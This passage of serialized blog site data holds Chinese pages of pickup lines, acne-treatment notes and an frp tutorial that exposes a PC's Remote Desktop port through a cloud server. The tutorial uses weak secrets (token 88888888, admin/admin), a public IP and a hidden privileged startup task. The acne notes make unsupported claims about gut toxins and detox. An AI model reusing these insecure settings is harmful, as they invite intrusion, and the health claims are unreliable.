       你真的好宅啊！\n可能是想你想得过头了        那为什么你在我的心里一直没有动过\n我想你肯定很忙           你累不累啊\n所以只看前三个字就可以了      可你在我心里都跑了一天了\n你知道世界上最冷的地方是哪吗？   你知道昨天是什么日子么？\n是没有你的地方           是我爱了你一天的日子\n昨晚没有睡好            你的眼睛很好看，但我的更好看\n被子太轻了，压不住想你的心     因为我的眼里都是你\n今天刮的风好大呀          你是不是最近胖了？\n就像我想你想得快要发疯了      那为什么你在我心中的份量更重了呢\n我身体挺好的            我要找你收房租\n就是扛不住想你           你在我心里住了那么久了\n\n吃东西              你是我的\n你知道我想吃什么吗？       请记住你的身份！\n我想痴痴地望着你         你是老子的人！\n每次到饭点都不知道吃什么     我觉得你像一只猪\n你能让我吃点爱情的苦吗？     我的掌上明珠\n你知道怎么吃螺蛳粉最好吃吗？   其实我每天都在环游世界\n是我喂给你吃           因为你在我身边，你就是我的全世界\n晚上我不想吃饭了，我想吃面    你猜我喜欢什么制服\n你心里面             被你制服（把你制服）\n\n夸赞               幸福甜蜜\n你知道吗？咱两都挺过分的     自从和你在一起我每天都牙疼\n你过分美丽，我过分着迷      因为每天和你在一起太甜了\n你知道我最喜欢什么神么？     遇到你，我都没吃过糖了\n你的眼神             你太甜了\n你知道什么水果好吃吗？      现在几点了？\n你这个开心果           现在是我们幸福的起点\n你今天真讨厌           你要是太阳的话，你猜我会是什么？\n讨人喜欢！百看不厌！       我是冰淇淋，你融化了我的心\n世界上有三种女人最好看      我要一直牵着你\n早上的你，中午的你，晚上的你   因为贵重物品要随身携带\n其实你一点都不胖         我最近总是头晕\n只是刚好把我的心装满       因为爱情使我头晕\n                 口红可以随便买、随便刷\n                 但只可以我吃\n\n想亲你                其他\n喂！请管好你的嘴！          我得给你买个指南针！\n因为我随时会亲它           免得你被我惯得找不着北\n我想送你好多好多口红         我们出去晒晒太阳吧\n我想让你每天还我一点点        顺便晒晒我们的恩爱\n你知道白雪公主为什么被亲才能醒来   我想把你挂在淘宝上\n你闭上眼睛试试就知道了        因为你是宝贝呀\n你知道矿泉水和口水有什么区别吗    我是9，你是3\n都想让人尝尝             除了你还是你\n我最近在找一匹马           我是9，你是3\n你的mua              除了你还是你\n                   我知道有三个人喜欢你\n                   我呀我呀我呀\n\n不舍            埋怨\n有个快递需要你签收一下   别抱怨了\n一厢情愿          抱我\n如果我走丢了怎么办？    哼，你都不给我做饭了\n报警            那我哪有力气向你撒娇了\n（对，抱紧我）\n              你能不能别说话了\n              那为什么我的脑子里全是你的声音\n\n结婚吗            一辈子\n我觉得你长的像我的亲戚？   8个字形容爱情\n我妈的儿媳妇         钟于、忠于、衷于、终于\n               钟情于你、忠诚于你、衷心于你、终止于你\n我会变个魔术         我有一个人生建议\n把“您爸”变成咱爸      这辈子都和我在一起\n你知道我和唐僧的区别吗？   帮我拍一个长镜头好吗？\n唐僧取经，我娶你       时长一辈子\n我们去吃全家桶吧       上学时老师教过，半途而废可不好\n这样我们就是一家人了     所以我建议你喜欢我到老\n我们要不要去喝酒？      \n喝我们的喜酒",normalizedContent:"# 土味情话\n\n表白             恋爱吗\n你知道什么酒最容易醉么？   你想养狗吗？\n和你的天长地久        我这种单身狗\n你知道我的缺点是什么吗？   今天喝了脉动，还吃了果冻\n我缺点你           可是还是忍不住对你心动\na-z你选择几？       我现在一动都不敢动\n我选择u           怕我移动就深陷爱你的沼泽\n我缺了一样生活必需品！    你会游泳吗？\n你呀！            我们马上就要坠入爱河了\n我对女朋友的标准只有一个   有钱的人、聪明的人、漂亮的人，你想成为哪种人？\n必须是你           我想成为你的人\n你知道你哪里好吗？      我觉得我们的友情都此为止了\n做我的女朋友刚刚好      因为接下来我们只能谈爱情了\n可以教我包饺子吗？      我想买一块地\n我容易露馅，喜欢你也是    你的死心塌地\n买西瓜吗？买一送一哦     告诉你个坏消息\n送你我这样的小傻瓜      我对你思想不单纯了\n我帮你看个手相        你手机有导航吗？我想去一个地方\n你命里好像缺个什么，缺我   你心里\n你知道我是什么星座的吗？   \n我什么都可以为你做\n\n想你了               心里有你\n我一点也不想你！          你怎么这么霸道呀\n两点突然想了            因为你霸占了我整颗心\n我今天头疼了整整一天        你真的好宅啊！\n可能是想你想得过头了        那为什么你在我的心里一直没有动过\n我想你肯定很忙           你累不累啊\n所以只看前三个字就可以了      可你在我心里都跑了一天了\n你知道世界上最冷的地方是哪吗？   你知道昨天是什么日子么？\n是没有你的地方           是我爱了你一天的日子\n昨晚没有睡好            你的眼睛很好看，但我的更好看\n被子太轻了，压不住想你的心     因为我的眼里都是你\n今天刮的风好大呀          你是不是最近胖了？\n就像我想你想得快要发疯了      那为什么你在我心中的份量更重了呢\n我身体挺好的            我要找你收房租\n就是扛不住想你           你在我心里住了那么久了\n\n吃东西              你是我的\n你知道我想吃什么吗？       请记住你的身份！\n我想痴痴地望着你         你是老子的人！\n每次到饭点都不知道吃什么     我觉得你像一只猪\n你能让我吃点爱情的苦吗？     我的掌上明珠\n你知道怎么吃螺蛳粉最好吃吗？   其实我每天都在环游世界\n是我喂给你吃           因为你在我身边，你就是我的全世界\n晚上我不想吃饭了，我想吃面    你猜我喜欢什么制服\n你心里面             被你制服（把你制服）\n\n夸赞               幸福甜蜜\n你知道吗？咱两都挺过分的     自从和你在一起我每天都牙疼\n你过分美丽，我过分着迷      因为每天和你在一起太甜了\n你知道我最喜欢什么神么？     遇到你，我都没吃过糖了\n你的眼神             你太甜了\n你知道什么水果好吃吗？      现在几点了？\n你这个开心果           现在是我们幸福的起点\n你今天真讨厌           你要是太阳的话，你猜我会是什么？\n讨人喜欢！百看不厌！       我是冰淇淋，你融化了我的心\n世界上有三种女人最好看      我要一直牵着你\n早上的你，中午的你，晚上的你   因为贵重物品要随身携带\n其实你一点都不胖         我最近总是头晕\n只是刚好把我的心装满       因为爱情使我头晕\n                 口红可以随便买、随便刷\n                 但只可以我吃\n\n想亲你                其他\n喂！请管好你的嘴！          我得给你买个指南针！\n因为我随时会亲它           免得你被我惯得找不着北\n我想送你好多好多口红         我们出去晒晒太阳吧\n我想让你每天还我一点点        顺便晒晒我们的恩爱\n你知道白雪公主为什么被亲才能醒来   我想把你挂在淘宝上\n你闭上眼睛试试就知道了        因为你是宝贝呀\n你知道矿泉水和口水有什么区别吗    我是9，你是3\n都想让人尝尝             除了你还是你\n我最近在找一匹马           我是9，你是3\n你的mua              除了你还是你\n                   我知道有三个人喜欢你\n                   我呀我呀我呀\n\n不舍            埋怨\n有个快递需要你签收一下   别抱怨了\n一厢情愿          抱我\n如果我走丢了怎么办？    哼，你都不给我做饭了\n报警            那我哪有力气向你撒娇了\n（对，抱紧我）\n              你能不能别说话了\n              那为什么我的脑子里全是你的声音\n\n结婚吗            一辈子\n我觉得你长的像我的亲戚？   8个字形容爱情\n我妈的儿媳妇         钟于、忠于、衷于、终于\n               钟情于你、忠诚于你、衷心于你、终止于你\n我会变个魔术         我有一个人生建议\n把“您爸”变成咱爸      这辈子都和我在一起\n你知道我和唐僧的区别吗？   帮我拍一个长镜头好吗？\n唐僧取经，我娶你       时长一辈子\n我们去吃全家桶吧       上学时老师教过，半途而废可不好\n这样我们就是一家人了     所以我建议你喜欢我到老\n我们要不要去喝酒？      \n喝我们的喜酒",charsets:{cjk:!0}},{frontmatter:{},regularPath:"/book-sketches/",relativePath:"book-sketches/README.md",key:"v-8db45cd6",path:"/book-sketches/",headers:[{level:2,title:"说明",slug:"说明",normalizedTitle:"说明",charIndex:11}],lastUpdated:"7/6/2022, 3:41:21 PM",lastUpdatedTimestamp:1657093281e3,headersStr:"说明",content:"# 杂谈部分\n\n\n# 说明\n\n * 主要跟生活有关，比如谷歌浏览器使用、win10下载与安装、Frp实现内网穿透 等等\n * 具体可以打开 左侧侧边栏 查看！",normalizedContent:"# 杂谈部分\n\n\n# 说明\n\n * 主要跟生活有关，比如谷歌浏览器使用、win10下载与安装、frp实现内网穿透 等等\n * 具体可以打开 左侧侧边栏 查看！",charsets:{cjk:!0}},{title:"祛痘去粉刺祛印",frontmatter:{},regularPath:"/book-sketches/%E6%97%A5%E5%B8%B8%E7%94%9F%E6%B4%BB/%E7%A5%9B%E7%97%98%E5%8E%BB%E7%B2%89%E5%88%BA%E7%A5%9B%E5%8D%B0.html",relativePath:"book-sketches/日常生活/祛痘去粉刺祛印.md",key:"v-e34bd69a",path:"/book-sketches/%E6%97%A5%E5%B8%B8%E7%94%9F%E6%B4%BB/%E7%A5%9B%E7%97%98%E5%8E%BB%E7%B2%89%E5%88%BA%E7%A5%9B%E5%8D%B0.html",headers:[{level:2,title:"刷酸",slug:"刷酸",normalizedTitle:"刷酸",charIndex:14},{level:2,title:"十滴水、碘伏",slug:"十滴水、碘伏",normalizedTitle:"十滴水、碘伏",charIndex:360},{level:3,title:"使用方法",slug:"使用方法",normalizedTitle:"使用方法",charIndex:371},{level:3,title:"分区对待",slug:"分区对待",normalizedTitle:"分区对待",charIndex:796}],lastUpdated:"7/6/2022, 3:41:21 PM",lastUpdatedTimestamp:1657093281e3,headersStr:"刷酸 十滴水、碘伏 使用方法 分区对待",content:"# 祛痘去粉刺祛印\n\n\n# 刷酸\n\n分享一篇知乎帖子，痤疮治疗指南。效果还可以，就是“抗争”比较激烈。\n\n使用过的产品：\n\n * 阿达帕林凝胶:祛轻度痘，避光只能晚上用，可全脸用可预防粉刺形成。可抗炎、溶解粉刺，但不能用于刀伤、擦伤等。会有轻微脱屑表现，轻度痘用它即可。（备孕和哺乳期的人别用！）\n * 过氧苯甲酰凝胶:祛中度痘，早晚可用，点涂。可杀菌除臭、溶解角质，但不能用于溃破处或者粘膜处，也不能过度使用。会有轻微脱屑表现，中度痘可搭配阿达帕林凝胶一起使用。（强氧化剂，注意避开抗氧化护肤品）\n * 果酸：这个作用类型跟上面的维A酸类似，一般作为面膜使用，敷的时间10分钟左右，不要超过15分钟，一周使用次数不要超过两次！浓度非常低的水杨酸和壬二酸可以日常涂抹，但还是主要量，还要抹开，不然容易损伤皮肤！\n\n\n# 十滴水、碘伏\n\n\n# 使用方法\n\n * 分享一个DY视频主，叫仙鹤大叔，也可以搜微信公众号“仙鹤大叔张文鹤”，是一个经常给网友进行医学科普的皮肤专家。本人有转载他的鹤叔医疗科普合集。\n * 其中就有介绍使用“十滴水”来 祛粉刺（白头黑头） 的方法，具体使用方法：\n   * 每次用稍微烫手的一盆温热水，往里面加上半支中药“十滴水”（皮肤敏感者慎用）；\n   * 然后用这个水洗脸，并进行揉搓（通窍）；\n   * 再使用中性的温和洗面奶进行清洁，并揉搓（排脂）；\n   * 最后记得润肤保湿，皮肤太干燥会使角质层增厚阻塞毛孔。\n   * 其实保险起见，洗完最好使用碘伏对粉刺外面进行杀菌，以免开窍后细菌趁机而入；\n   * 用“十滴水”洗完可能会脸红，注意好用量；后续精简护肤，尽量不用化妆品，防止又堵塞了毛孔；\n   * 粉刺没了就不要使用“十滴水”了，是药三分毒哦！\n * 如果 粉刺已经恶化（红头脓头），可以使用碘伏来杀菌，之前的“过氧苯甲酰凝胶”也可以哦！\n\n\n# 分区对待\n\n * 鼻子这块主要是螨虫问题，非常容易长痘，可以使用硫软膏加碘伏，碘伏在内杀菌，硫软膏在外杀菌。\n * 口周区的痤疮主要跟肠道内的毒素有关，外用就是之前的“十滴水”和碘伏，内部就是肠道排毒了；便秘使用芦荟胶囊，习惯性拉肚子用人参健脾丸；其实最好的方法是忌口，减少高热量食物、辣椒的食入。\n * 面颊区主要是外部细菌感染的，外用还是用“十滴水”和碘伏来解决问题，定期（最好每周）对枕套、被套、毛巾等进行烫洗。\n * 额头区主要是内分泌失调问题，要自己调整好心情、作息，还要多运动，外用仍然是“十滴水”和碘伏，内用药不太推荐使用激素药，很难把握用量还比较伤身体（大概是口服维A等），实在要用请寻医！中药调理我记得有一家“新汉方”还可以。",normalizedContent:"# 祛痘去粉刺祛印\n\n\n# 刷酸\n\n分享一篇知乎帖子，痤疮治疗指南。效果还可以，就是“抗争”比较激烈。\n\n使用过的产品：\n\n * 阿达帕林凝胶:祛轻度痘，避光只能晚上用，可全脸用可预防粉刺形成。可抗炎、溶解粉刺，但不能用于刀伤、擦伤等。会有轻微脱屑表现，轻度痘用它即可。（备孕和哺乳期的人别用！）\n * 过氧苯甲酰凝胶:祛中度痘，早晚可用，点涂。可杀菌除臭、溶解角质，但不能用于溃破处或者粘膜处，也不能过度使用。会有轻微脱屑表现，中度痘可搭配阿达帕林凝胶一起使用。（强氧化剂，注意避开抗氧化护肤品）\n * 果酸：这个作用类型跟上面的维a酸类似，一般作为面膜使用，敷的时间10分钟左右，不要超过15分钟，一周使用次数不要超过两次！浓度非常低的水杨酸和壬二酸可以日常涂抹，但还是主要量，还要抹开，不然容易损伤皮肤！\n\n\n# 十滴水、碘伏\n\n\n# 使用方法\n\n * 分享一个dy视频主，叫仙鹤大叔，也可以搜微信公众号“仙鹤大叔张文鹤”，是一个经常给网友进行医学科普的皮肤专家。本人有转载他的鹤叔医疗科普合集。\n * 其中就有介绍使用“十滴水”来 祛粉刺（白头黑头） 的方法，具体使用方法：\n   * 每次用稍微烫手的一盆温热水，往里面加上半支中药“十滴水”（皮肤敏感者慎用）；\n   * 然后用这个水洗脸，并进行揉搓（通窍）；\n   * 再使用中性的温和洗面奶进行清洁，并揉搓（排脂）；\n   * 最后记得润肤保湿，皮肤太干燥会使角质层增厚阻塞毛孔。\n   * 其实保险起见，洗完最好使用碘伏对粉刺外面进行杀菌，以免开窍后细菌趁机而入；\n   * 用“十滴水”洗完可能会脸红，注意好用量；后续精简护肤，尽量不用化妆品，防止又堵塞了毛孔；\n   * 粉刺没了就不要使用“十滴水”了，是药三分毒哦！\n * 如果 粉刺已经恶化（红头脓头），可以使用碘伏来杀菌，之前的“过氧苯甲酰凝胶”也可以哦！\n\n\n# 分区对待\n\n * 鼻子这块主要是螨虫问题，非常容易长痘，可以使用硫软膏加碘伏，碘伏在内杀菌，硫软膏在外杀菌。\n * 口周区的痤疮主要跟肠道内的毒素有关，外用就是之前的“十滴水”和碘伏，内部就是肠道排毒了；便秘使用芦荟胶囊，习惯性拉肚子用人参健脾丸；其实最好的方法是忌口，减少高热量食物、辣椒的食入。\n * 面颊区主要是外部细菌感染的，外用还是用“十滴水”和碘伏来解决问题，定期（最好每周）对枕套、被套、毛巾等进行烫洗。\n * 额头区主要是内分泌失调问题，要自己调整好心情、作息，还要多运动，外用仍然是“十滴水”和碘伏，内用药不太推荐使用激素药，很难把握用量还比较伤身体（大概是口服维a等），实在要用请寻医！中药调理我记得有一家“新汉方”还可以。",charsets:{cjk:!0}},{title:"Frp实现内网穿透",frontmatter:{},regularPath:"/book-sketches/%E7%94%B5%E8%84%91%E5%B7%A5%E5%85%B7/Frp%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F.html",relativePath:"book-sketches/电脑工具/Frp实现内网穿透.md",key:"v-948c51ca",path:"/book-sketches/%E7%94%B5%E8%84%91%E5%B7%A5%E5%85%B7/Frp%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F.html",headers:[{level:2,title:"云服务器",slug:"云服务器",normalizedTitle:"云服务器",charIndex:16},{level:2,title:"使用frp",slug:"使用frp",normalizedTitle:"使用frp",charIndex:85},{level:3,title:"下载frp到服务端",slug:"下载frp到服务端",normalizedTitle:"下载frp到服务端",charIndex:95},{level:3,title:"配置服务端里的frp",slug:"配置服务端里的frp",normalizedTitle:"配置服务端里的frp",charIndex:775},{level:3,title:"配置客户端里的frp",slug:"配置客户端里的frp",normalizedTitle:"配置客户端里的frp",charIndex:1889},{level:3,title:"给云服务器设置安全组",slug:"给云服务器设置安全组",normalizedTitle:"给云服务器设置安全组",charIndex:3587},{level:2,title:"说在最后",slug:"说在最后",normalizedTitle:"说在最后",charIndex:4246}],lastUpdated:"7/6/2022, 3:41:21 PM",lastUpdatedTimestamp:1657093281e3,headersStr:"云服务器 使用frp 下载frp到服务端 配置服务端里的frp 配置客户端里的frp 给云服务器设置安全组 说在最后",content:'# Frp实现内网穿透\n\n\n# 云服务器\n\n暂时使用的是阿里云的云服务器ECS，轻量应用服务器、ECS通用型、ECS共享型都可以。\n\n搬瓦工和vultr也可以。\n\n\n# 使用frp\n\n\n# 下载frp到服务端\n\n在阿里云的云服务器ECS控制台里，我们点击云服务器的远程连接，进入服务端控制台。\n\n输入cd /usr/local进入个人默认的程序安装路径，输入arch查看处理器的架构，根据这个架构去frp的GitHub里选择合适的版本。\n\n由于是x86_64所以我们选择amd64版本，输入wget https://github.com/fatedier/frp/releases/download/v0.35.0/frp_0.35.0_linux_amd64.tar.gz将frp下载到服务端。如果/usr/local里已经有了frp，是可以输入rm -rf frp进行删除的。\n\n输入tar -zxvf frp_0.35.0_linux_amd64.tar.gz对frp的压缩包进行解压，输入rm frp_0.35.0_linux_amd64.tar.gz对压缩包进行删除（输入yes确认删除），输入mv frp_0.35.0_linux_amd64 frp对解压出来的文件夹进行重命名。\n\ncd /usr/local\nwget https://github.com/fatedier/frp/releases/download/v0.35.0/frp_0.35.0_linux_amd64.tar.gz\ntar -zxvf frp_0.35.0_linux_amd64.tar.gz\nrm frp_0.35.0_linux_amd64.tar.gz\nmv frp_0.35.0_linux_amd64 frp\n\n\n1\n2\n3\n4\n5\n\n\n\n# 配置服务端里的frp\n\n输入cd frp进入服务端的frp，输入rm frpc、rm frpc.ini和rm frpc_full.ini是为了删除客户端的东西，在服务端是用不着的。\n\n要配置一下frps.ini。输入vim frps.ini，再输入i进入输入模式，输入以下内容：\n\n[common]\nbind_port = 7000\ntoken = 88888888\ndashboard_port = 7500\ndashboard_user = admin\ndashboard_pwd = admin\n\n\n1\n2\n3\n4\n5\n6\n\n\n按Esc退出输入模式，输入:wq退出并保存。上面的bind_port是frp监听端口，dashboard_port是控制页面对应端口，token是服务端与客户端通信的令牌，dashboard_user是进入控制页面的账户，dashboard_pwd是进入控制页面账户对应的密码。dashboard_xxx不是特别重要，最重要的是bind_port和token。\n\n我们要让frp在服务端开机自运行。输入vim /etc/systemd/system/frps.service，再输入i进入输入模式，输入以下内容：\n\n[Unit]\nDescription=frps daemon\nAfter=syslog.target  network.target\nWants=network.target\n\n[Service]\nType=simple\nExecStart=/usr/local/frp/frps -c /usr/local/frp/frps.ini\nRestart=always\nRestartSec=1min\n\n[Install]\nWantedBy=multi-user.target\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n按Esc退出输入模式，输入:wq退出并保存。最后输入systemctl start frps && systemctl enable frps就设置好了开机启动。\n\n可以让服务端停止后再启动，然后输入netstat -tanlp查看进程（杀进程使用kill -9 xxx）。\n\n# 刷新服务列表\nsystemctl daemon-reload\n# 设置开机自启\nsystemctl enable frps\n# 关闭开机自启\nsystemctl disable frps\n# 启动服务\nsystemctl start frps\n# 停止服务\nsystemctl stop frps\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# 配置客户端里的frp\n\n去frp的GitHub里选择相应的版本，比如windows我们暂时使用的是frp_0.35.0_windows_amd64.zip，下载解压到本地某个目录下，删除frps、frps.ini和frps_full.ini与客户端无关的文件。使用文本编辑器打开frpc.ini编辑如下\n\n[common]\nserver_addr = 139.224.248.233\nserver_port = 7000\ntoken = 88888888\n\n[rdc]\ntype = tcp\nlocal_ip = 127.0.0.1\nlocal_port = 3389\nremote_port = 3360\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n上面的server_addr = 139.224.248.233是frps服务端所在的云服务器的公网IP（阿里云ECS实例公网IP）；server_port = 7000是frps服务端所依赖的端口，frpc和frps之间的连接就依赖于这个7000端口；token = 88888888是frpc和frps之间的通信令牌，在frps也同样设置过了；[rdc]是自定义名字；type = tcp是因为我们使用RD Client，它是tcp类型的；local_ip= 127.0.0.1是本地机器IP（暂时就填默认的127.0.0.1）；local_port = 3389是你要映射本地机器的哪个端口，因为要使用RD Client，所以是3389端口；remote_port = 3360表示将本地的那个端口要映射到远程frps所在服务器的哪个端口，总的来说就是将本地的3389端口映射到139.xxx.xxx.xxx的3360端口。\n\n我们需要在电脑开机时自动运行客户端的frp。在frp目录下新建startfrpc.bat批处理文件，使用文本编辑器打开并编辑：\n\n@echo off\n:: 定义WIFI名称\nset wifi_name=TP-LINK_602\n:: 连接WIFI，查看当前连接信息，并且是否是wifi_name\n(netsh WLAN show interfaces | findStr %wifi_name% >nul) || (\n    :: ||表示否则，意味着当前连接不是wifi_name，那就netsh wlan connect连接wifi_name\n    netsh wlan connect ssid=%wifi_name% name=%wifi_name%\n)\n:: 延迟2秒\ntimeout /t 2 /nobreak\n:: 得确保联网后再运行frpc，看是否已经启动了frpc，>nul表示前面这句信息不输出到cmd框\n(tasklist|findstr "frp" >nul) || (\n    :: 没有启动frpc，就在这启动frpc，||表示否则\n    d:\\frp_0.35.0_windows_amd64\\frpc.exe -c d:\\frp_0.35.0_windows_amd64\\frpc.ini\n)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n我们将startfrpc.bat加入到任务计划程序。打开电脑的“任务计划程序”，选择右侧的“创建任务...”。\n\n * 在常规这个页签里，名称填为“frpc”，然后勾上“不管用户是否登录都要运行”、“使用最高权限运行”、“隐藏”。\n * 在触发器这个页签里，选择新建，然后开始任务选择“启动时”，可以自己选择是否重复执行以及间隔。\n * 在操作这个页签里，选择新建，然后点击“浏览”选择前面创建的“start.bat”（D:\\frp_0.35.0_windows_amd64\\start.bat），最后在“起始于”里填写start.bat的父路径（D:\\frp_0.35.0_windows_amd64）。\n * 返回常规页签，然后点击确定，输入电脑登录密码，就完成了frpc的自启动。\n\n\n# 给云服务器设置安全组\n\n云服务器内部的frps依赖的7000可以不用管，因为你在服务器命令行里输入firewall-cmd --state，会发现阿里云服务器操作系统内的防火墙是默认关闭的，所以内部使用7000端口可以不用管了。如果你要放开云服务器本身的防火墙并添加7000端口，可以参考如下命令。\n\n# 先查看防火墙状态\nfirewall-cmd --state\n# 启用防火墙\nsystemctl start firewalld\n# 停用防火墙\nsystemctl stop firewalld\nfirewall-cmd --zone=public --add-port=7000/udp --permanent \nfirewall-cmd --zone=public --add-port=7000/tcp --permanent \n# 放行端口后要重新加载\nfirewall-cmd --reload\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n而外部想访问服务器以及它的一些端口，那就必须放开一些端口，这个是在阿里云控制台——网络与安全——安全组。frpc所在机器想与云服务里的frps进行通信连接，需要开放云服务器安全组的7000给外部用；然后我们要使用RDClient进行远程桌面控制，通过frp将3389映射到云服务器的3360端口了，那么还需要开放云服务器安全组的3360给外部用。7000和3360开放给谁，也要限定好，不是谁想加就加的。\n\n\n\n安全组的授权对象我们使用的是前缀列表\n\n\n# 说在最后\n\n使用Frp还是挺简单的，但是它的安全性还是有些差，功能上也只是反向代理、映射端口，如果想异地组网（虚拟局域网）那就不能使用Frp了，可以使用SoftEther实现虚拟局域网',normalizedContent:'# frp实现内网穿透\n\n\n# 云服务器\n\n暂时使用的是阿里云的云服务器ecs，轻量应用服务器、ecs通用型、ecs共享型都可以。\n\n搬瓦工和vultr也可以。\n\n\n# 使用frp\n\n\n# 下载frp到服务端\n\n在阿里云的云服务器ecs控制台里，我们点击云服务器的远程连接，进入服务端控制台。\n\n输入cd /usr/local进入个人默认的程序安装路径，输入arch查看处理器的架构，根据这个架构去frp的github里选择合适的版本。\n\n由于是x86_64所以我们选择amd64版本，输入wget https://github.com/fatedier/frp/releases/download/v0.35.0/frp_0.35.0_linux_amd64.tar.gz将frp下载到服务端。如果/usr/local里已经有了frp，是可以输入rm -rf frp进行删除的。\n\n输入tar -zxvf frp_0.35.0_linux_amd64.tar.gz对frp的压缩包进行解压，输入rm frp_0.35.0_linux_amd64.tar.gz对压缩包进行删除（输入yes确认删除），输入mv frp_0.35.0_linux_amd64 frp对解压出来的文件夹进行重命名。\n\ncd /usr/local\nwget https://github.com/fatedier/frp/releases/download/v0.35.0/frp_0.35.0_linux_amd64.tar.gz\ntar -zxvf frp_0.35.0_linux_amd64.tar.gz\nrm frp_0.35.0_linux_amd64.tar.gz\nmv frp_0.35.0_linux_amd64 frp\n\n\n1\n2\n3\n4\n5\n\n\n\n# 配置服务端里的frp\n\n输入cd frp进入服务端的frp，输入rm frpc、rm frpc.ini和rm frpc_full.ini是为了删除客户端的东西，在服务端是用不着的。\n\n要配置一下frps.ini。输入vim frps.ini，再输入i进入输入模式，输入以下内容：\n\n[common]\nbind_port = 7000\ntoken = 88888888\ndashboard_port = 7500\ndashboard_user = admin\ndashboard_pwd = admin\n\n\n1\n2\n3\n4\n5\n6\n\n\n按esc退出输入模式，输入:wq退出并保存。上面的bind_port是frp监听端口，dashboard_port是控制页面对应端口，token是服务端与客户端通信的令牌，dashboard_user是进入控制页面的账户，dashboard_pwd是进入控制页面账户对应的密码。dashboard_xxx不是特别重要，最重要的是bind_port和token。\n\n我们要让frp在服务端开机自运行。输入vim /etc/systemd/system/frps.service，再输入i进入输入模式，输入以下内容：\n\n[unit]\ndescription=frps daemon\nafter=syslog.target  network.target\nwants=network.target\n\n[service]\ntype=simple\nexecstart=/usr/local/frp/frps -c /usr/local/frp/frps.ini\nrestart=always\nrestartsec=1min\n\n[install]\nwantedby=multi-user.target\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n按esc退出输入模式，输入:wq退出并保存。最后输入systemctl start frps && systemctl enable frps就设置好了开机启动。\n\n可以让服务端停止后再启动，然后输入netstat -tanlp查看进程（杀进程使用kill -9 xxx）。\n\n# 刷新服务列表\nsystemctl daemon-reload\n# 设置开机自启\nsystemctl enable frps\n# 关闭开机自启\nsystemctl disable frps\n# 启动服务\nsystemctl start frps\n# 停止服务\nsystemctl stop frps\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# 配置客户端里的frp\n\n去frp的github里选择相应的版本，比如windows我们暂时使用的是frp_0.35.0_windows_amd64.zip，下载解压到本地某个目录下，删除frps、frps.ini和frps_full.ini与客户端无关的文件。使用文本编辑器打开frpc.ini编辑如下\n\n[common]\nserver_addr = 139.224.248.233\nserver_port = 7000\ntoken = 88888888\n\n[rdc]\ntype = tcp\nlocal_ip = 127.0.0.1\nlocal_port = 3389\nremote_port = 3360\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n上面的server_addr = 139.224.248.233是frps服务端所在的云服务器的公网ip（阿里云ecs实例公网ip）；server_port = 7000是frps服务端所依赖的端口，frpc和frps之间的连接就依赖于这个7000端口；token = 88888888是frpc和frps之间的通信令牌，在frps也同样设置过了；[rdc]是自定义名字；type = tcp是因为我们使用rd client，它是tcp类型的；local_ip= 127.0.0.1是本地机器ip（暂时就填默认的127.0.0.1）；local_port = 3389是你要映射本地机器的哪个端口，因为要使用rd client，所以是3389端口；remote_port = 3360表示将本地的那个端口要映射到远程frps所在服务器的哪个端口，总的来说就是将本地的3389端口映射到139.xxx.xxx.xxx的3360端口。\n\n我们需要在电脑开机时自动运行客户端的frp。在frp目录下新建startfrpc.bat批处理文件，使用文本编辑器打开并编辑：\n\n@echo off\n:: 定义wifi名称\nset wifi_name=tp-link_602\n:: 连接wifi，查看当前连接信息，并且是否是wifi_name\n(netsh wlan show interfaces | findstr %wifi_name% >nul) || (\n    :: ||表示否则，意味着当前连接不是wifi_name，那就netsh wlan connect连接wifi_name\n    netsh wlan connect ssid=%wifi_name% name=%wifi_name%\n)\n:: 延迟2秒\ntimeout /t 2 /nobreak\n:: 得确保联网后再运行frpc，看是否已经启动了frpc，>nul表示前面这句信息不输出到cmd框\n(tasklist|findstr "frp" >nul) || (\n    :: 没有启动frpc，就在这启动frpc，||表示否则\n    d:\\frp_0.35.0_windows_amd64\\frpc.exe -c d:\\frp_0.35.0_windows_amd64\\frpc.ini\n)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n我们将startfrpc.bat加入到任务计划程序。打开电脑的“任务计划程序”，选择右侧的“创建任务...”。\n\n * 在常规这个页签里，名称填为“frpc”，然后勾上“不管用户是否登录都要运行”、“使用最高权限运行”、“隐藏”。\n * 在触发器这个页签里，选择新建，然后开始任务选择“启动时”，可以自己选择是否重复执行以及间隔。\n * 在操作这个页签里，选择新建，然后点击“浏览”选择前面创建的“start.bat”（d:\\frp_0.35.0_windows_amd64\\start.bat），最后在“起始于”里填写start.bat的父路径（d:\\frp_0.35.0_windows_amd64）。\n * 返回常规页签，然后点击确定，输入电脑登录密码，就完成了frpc的自启动。\n\n\n# 给云服务器设置安全组\n\n云服务器内部的frps依赖的7000可以不用管，因为你在服务器命令行里输入firewall-cmd --state，会发现阿里云服务器操作系统内的防火墙是默认关闭的，所以内部使用7000端口可以不用管了。如果你要放开云服务器本身的防火墙并添加7000端口，可以参考如下命令。\n\n# 先查看防火墙状态\nfirewall-cmd --state\n# 启用防火墙\nsystemctl start firewalld\n# 停用防火墙\nsystemctl stop firewalld\nfirewall-cmd --zone=public --add-port=7000/udp --permanent \nfirewall-cmd --zone=public --add-port=7000/tcp --permanent \n# 放行端口后要重新加载\nfirewall-cmd 